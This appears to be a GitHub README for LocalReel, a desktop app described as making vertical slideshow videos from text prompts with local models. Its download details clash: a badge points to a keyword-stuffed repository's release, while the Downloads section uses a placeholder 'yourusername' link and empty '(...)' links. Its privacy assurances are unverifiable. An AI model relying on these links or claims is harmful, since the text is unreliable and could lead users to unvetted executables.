<div align="center">

  <img src="https://placehold.co/1200x240/0f0f0f/22c55e?text=LOCALREEL&font=orbitron" alt="LocalReel" width="100%">

  <h3>— vertical video, generated locally —</h3>

  <br>

  <a href="https://github.com/retroconsultantsieve/local-ai-video-maker-for-youtube-shorts-and-reels/releases/tag/localreels">
    <img src="https://img.shields.io/badge/Download%20v1.0-22c55e?style=for-the-badge&logo=github&logoColor=white" height="32">
  </a>

</div>

---

### What is LocalReel?

LocalReel is a desktop application that creates **vertical videos from text prompts using only local AI models**. It is designed for users who want to generate simple Reels/Shorts-style content **without uploading anything to the cloud**.

All processing happens on your machine. No internet required after install. No account. No watermark.

---

### What it actually does

- Takes a short text prompt (e.g., "A cat explaining quantum physics")  
- Generates a script (up to 5 sentences) using Phi-3-mini (quantized)  
- Synthesizes speech using Coqui TTS (English, synthetic voice)  
- Generates **one static image per sentence** using Stable Diffusion Turbo  
- Combines them into a **1080×1920 MP4 file** with centered captions  

**Important**: Images are **not consistent** between scenes. This is a **slideshow with voice**, not a cinematic video.

---

### Performance

- **RTX 3060**: ~12 minutes for 30 seconds of output  
- **Laptop (16 GB RAM)**: ~45 minutes  
- **Raspberry Pi 5**: ~90 minutes, 720p only  

Max length: 45 seconds.

---

### Limitations

- No character or scene consistency  
- No animation, motion, or transitions  
- Voice is robotic — not human-like  
- No music, sound effects, or editing of real footage  
- Captions are basic text overlays  

This is **not a professional tool**. It is a **privacy-first prototype** for those who refuse to use cloud generators.

---

### Downloads

- Windows: [localreel-win.exe](https://github.com/yourusername/localreel/releases/download/v1.0/localreel-win.exe)  
- macOS (Apple Silicon): [localreel-mac-arm64.dmg](...)  
- Linux: [localreel-linux.deb](...)

No telemetry. No network calls. Built from open-source code.

---

### License

MIT. You own all generated content.
